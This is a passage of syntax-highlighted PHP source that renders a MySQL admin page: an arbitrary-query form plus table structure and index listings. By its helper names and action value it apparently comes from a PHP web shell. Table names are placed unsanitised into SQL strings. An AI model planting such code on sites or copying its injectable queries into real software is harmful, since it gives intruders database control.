<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">getnumsql</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">runquery</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">sql_query</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">runquery</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">allowedit</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">tablename</span> &amp;&amp; !$<span style="color: #f0c674;">sql_query</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">sql_query</span> = <span style="color: #8abeb7;">"SELECT * FROM $tablename"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">getnumsql</span> = $<span style="color: #f0c674;">sql_query</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">sql_query</span> = $<span style="color: #f0c674;">sql_query</span>.<span style="color: #8abeb7;">" LIMIT $start_limit, $pagenum"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">allowedit</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;form action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;</span><span style="color: #8abeb7; text-decoration: underline;">&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">sql_query</span><span style="text-decoration: underline;">,</span><span style="color: #81a2be; text-decoration: underline;">ENT_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'tablename'</span>, $<span style="color: #f0c674;">tablename</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">dbform</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">tablename</span> || ($<span style="color: #f0c674;">runquery</span> &amp;&amp; $<span style="color: #f0c674;">sql_query</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'structure'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SHOW FULL COLUMNS FROM $tablename"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">row</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_array(</span>$<span style="color: #f0c674;">result</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span>[] = $<span style="color: #f0c674;">row</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h3&gt;Structure&lt;/h3&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Key&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Default&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Extra&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Privileges&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">rowdb</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">row</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">thisbg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.$<span style="color: #f0c674;">thisbg</span>.<span style="color: #8abeb7;">'" onmouseover="this.className=\</span><span style="color: #8abeb7; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Type'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Collation'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Null'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Default'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Extra'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Privileges'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Comment'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">tbfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SHOW INDEX FROM $tablename"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">row</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_array(</span>$<span style="color: #f0c674;">result</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span>[] = $<span style="color: #f0c674;">row</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h3&gt;Indexes&lt;/h3&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Keyname&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Unique&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Packed&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Seq_in_index&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Cardinality&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">rowdb</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">row</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">thisbg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.$<span style="color: #f0c674;">thisbg</span>.<span style="color: #8abeb7;">'" onmouseover="this.className=\</span><span style="color: #8abeb7; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key_name'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Index_type'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.($<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Non_unique'</span>] ? <span style="color: #8abeb7;">'No'</span> : <span style="color: #8abeb7;">'Yes'</span>).<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.($<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Packed'</span>] === <span style="color: #81a2be;">null</span> ? <span style="color: #8abeb7;">'No'</span> : $<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Packed'</span><span style="text-decoration: underline;">]).</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Seq_in_index'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
